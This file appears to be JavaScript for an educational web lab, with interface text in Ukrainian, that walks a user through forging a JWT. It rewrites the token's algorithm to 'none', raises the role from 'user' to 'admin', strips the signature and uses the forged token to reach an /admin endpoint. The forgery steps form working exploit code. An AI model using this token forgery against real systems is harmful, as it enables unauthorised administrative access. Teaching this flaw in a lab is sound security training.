let currentToken = '';
let isTokenModified = false;

function updateStep(stepNum, status) {
    const step = document.getElementById(`step${stepNum}`);
    const icons = { completed: 'OK', active: 'IN_PROGRESS', waiting: 'WAIT' };
    step.className = `progress-step ${status}`;
    const iconSpan = step.querySelector('.icon');
    if (iconSpan) iconSpan.textContent = icons[status] || 'WAIT';
}

function base64UrlEncode(str) {
    return btoa(str)
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=/g, '');
}

function base64UrlDecode(str) {
    str = str.replace(/-/g, '+').replace(/_/g, '/');
    while (str.length % 4) str += '=';
    return atob(str);
}

function displayTokenParts(token, modified = false) {
    const parts = token.split('.');
    let header = {};
    let payload = {};
    let signature = parts[2] || '(порожній)';

    try {
        header = JSON.parse(base64UrlDecode(parts[0]));
    } catch (e) {
        header = { error: 'не вдалося розкодити' };
    }
    try {
        payload = JSON.parse(base64UrlDecode(parts[1]));
    } catch (e) {
        payload = { error: 'не вдалося розкодити' };
    }

    const partsDiv = document.getElementById('tokenParts');
    partsDiv.innerHTML = `
        <div class="token-part">
            <div class="token-part-label">HEADER (алгоритм підпису):</div>
            <div class="token-part-value">${parts[0] || ''}</div>
            <div class="token-decoded">${JSON.stringify(header, null, 2)}</div>
        </div>
        <div class="token-part">
            <div class="token-part-label">PAYLOAD (дані користувача):</div>
            <div class="token-part-value">${parts[1] || ''}</div>
            <div class="token-decoded">${JSON.stringify(payload, null, 2)}</div>
        </div>
        <div class="token-part">
            <div class="token-part-label">SIGNATURE (підпис):</div>
            <div class="token-part-value" style="color: ${signature === '(порожній)' ? '#ff6b6b' : '#00ff00'}">${signature}</div>
            ${modified ? '<div class="token-decoded" style="color: #ff6b6b;">Підпис видалено - токен модифіковано</div>' : ''}
        </div>
    `;
    partsDiv.classList.remove('hidden');
}

async function postData(url, body) {
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(body)
    });
    return res.json();
}

document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    document.getElementById('progressBox').classList.remove('hidden');
    updateStep(1, 'active');

    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();

    let data;
    try {
        data = await postData('/login', { username, password });
    } catch (err) {
        const resultDiv = document.getElementById('result');
        resultDiv.classList.remove('hidden', 'success', 'error');
        resultDiv.classList.add('error');
        resultDiv.innerHTML = '<h3>Помилка входу</h3><pre>' + (err.message || 'network error') + '</pre>';
        updateStep(1, 'error');
        return;
    }

    const resultDiv = document.getElementById('result');
    resultDiv.classList.remove('hidden', 'success', 'error');

    if (data && data.success) {
        currentToken = data.token;
        document.getElementById('tokenValue').textContent = data.token;
        document.getElementById('tokenDisplay').classList.remove('hidden');
        document.getElementById('actions').classList.remove('hidden');

        updateStep(1, 'completed');

        resultDiv.classList.add('success');
        resultDiv.innerHTML = '<h3>Успішний вхід</h3><pre>' + JSON.stringify(data, null, 2) + '</pre>';

        document.getElementById('analyzeBtn').disabled = false;
    } else {
        updateStep(1, 'error');
        resultDiv.classList.add('error');
        resultDiv.innerHTML = '<h3>Помилка входу</h3><pre>' + JSON.stringify(data || {}, null, 2) + '</pre>';
    }
});

document.getElementById('analyzeBtn').addEventListener('click', () => {
    updateStep(2, 'active');
    displayTokenParts(currentToken);
    updateStep(2, 'completed');
    document.getElementById('modifyTokenBtn').disabled = false;

    const resultDiv = document.getElementById('result');
    resultDiv.classList.remove('hidden', 'error');
    resultDiv.classList.add('success');
    resultDiv.innerHTML = `
        <h3>Токен проаналізовано</h3>
        <p>Зверніть увагу:</p>
        <ul style="margin-left: 20px; margin-top: 10px;">
            <li><strong>Algorithm:</strong> HS256 (потрібно змінити на "none")</li>
            <li><strong>Role:</strong> user (потрібно змінити на "admin")</li>
            <li><strong>Signature:</strong> присутній (потрібно видалити)</li>
        </ul>
    `;
});

document.getElementById('modifyTokenBtn').addEventListener('click', () => {
    if (!currentToken) {
        alert('Спочатку увійдіть в систему!');
        return;
    }

    updateStep(3, 'active');

    try {
        const parts = currentToken.split('.');

        const header = JSON.parse(base64UrlDecode(parts[0]));
        const payload = JSON.parse(base64UrlDecode(parts[1]));

        updateStep(3, 'completed');
        updateStep(4, 'active');

        header.alg = 'none';
        payload.role = 'admin';

        updateStep(4, 'completed');
        updateStep(5, 'active');

        const newHeader = base64UrlEncode(JSON.stringify(header));
        const newPayload = base64UrlEncode(JSON.stringify(payload));

        const maliciousToken = `${newHeader}.${newPayload}.`;

        updateStep(5, 'completed');

        document.getElementById('tokenValue').textContent = maliciousToken;
        currentToken = maliciousToken;
        isTokenModified = true;

        displayTokenParts(maliciousToken, true);

        document.getElementById('viewAdminBtn').disabled = false;

        const resultDiv = document.getElementById('result');
        resultDiv.classList.remove('hidden', 'error');
        resultDiv.classList.add('success');
        resultDiv.innerHTML = `
            <h3>Токен успішно модифіковано</h3>
            <p><strong>Зміни:</strong></p>
            <ul style="margin-left: 20px; margin-top: 10px;">
                <li>Algorithm: HS256 → none</li>
                <li>Role: user → admin</li>
                <li>Signature: видалено</li>
            </ul>
            <p style="margin-top: 15px; color: #856404;">
                Тепер натисніть "Крок 6: Отримати доступ адміна"
            </p>
        `;
    } catch (error) {
        const resultDiv = document.getElementById('result');
        resultDiv.classList.remove('hidden', 'success');
        resultDiv.classList.add('error');
        resultDiv.innerHTML = '<h3>Помилка модифікації</h3><pre>' + (error.message || String(error)) + '</pre>';
    }
});

document.getElementById('viewProfileBtn').addEventListener('click', async () => {
    const token = document.getElementById('tokenValue').textContent || currentToken;
    let res, data;
    try {
        res = await fetch('/profile', { headers: { 'Authorization': `Bearer ${token}` } });
        data = await res.json();
    } catch (err) {
        data = { success: false, error: 'network error' };
    }

    const resultDiv = document.getElementById('result');
    resultDiv.classList.remove('hidden', 'success', 'error');

    if (data && data.success) {
        resultDiv.classList.add('success');
        resultDiv.innerHTML = '<h3>Профіль отримано</h3><pre>' + JSON.stringify(data, null, 2) + '</pre>';
    } else {
        resultDiv.classList.add('error');
        resultDiv.innerHTML = '<h3>Помилка</h3><pre>' + JSON.stringify(data || {}, null, 2) + '</pre>';
    }
});

document.getElementById('viewAdminBtn').addEventListener('click', async () => {
    updateStep(6, 'active');

    const token = document.getElementById('tokenValue').textContent || currentToken;
    let res, data;
    try {
        res = await fetch('/admin', { headers: { 'Authorization': `Bearer ${token}` } });
        data = await res.json();
    } catch (err) {
        data = { success: false, error: 'network error' };
    }

    const resultDiv = document.getElementById('result');
    resultDiv.classList.remove('hidden', 'success', 'error');

    if (data && data.success) {
        updateStep(6, 'completed');
        resultDiv.classList.add('success');
        resultDiv.innerHTML = `
            <h3>Успіх! Отримано доступ до адмін-панелі</h3>
            <pre>${JSON.stringify(data, null, 2)}</pre>
            <div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin-top: 15px;">
                <strong>Вітаємо! Ви успішно обійшли JWT аутентифікацію</strong>
                <p style="margin-top: 10px;">
                    Ви експлуатували вразливість A02:2021 - Cryptographic Failures, змінивши алгоритм на "none" і видаливши підпис токена.
                </p>
            </div>
        `;
    } else {
        resultDiv.classList.add('error');
        resultDiv.innerHTML = '<h3>Доступ заборонено</h3><pre>' + JSON.stringify(data || {}, null, 2) + '</pre>';
    }
});

document.getElementById('copyBtn').addEventListener('click', () => {
    const token = document.getElementById('tokenValue').textContent;
    if (!token) {
        alert('Немає токена для копіювання');
        return;
    }
    navigator.clipboard.writeText(token).then(() => {
        alert('Токен скопійовано!');
    }).catch(() => {
        alert('Не вдалося скопіювати токен');
    });
});
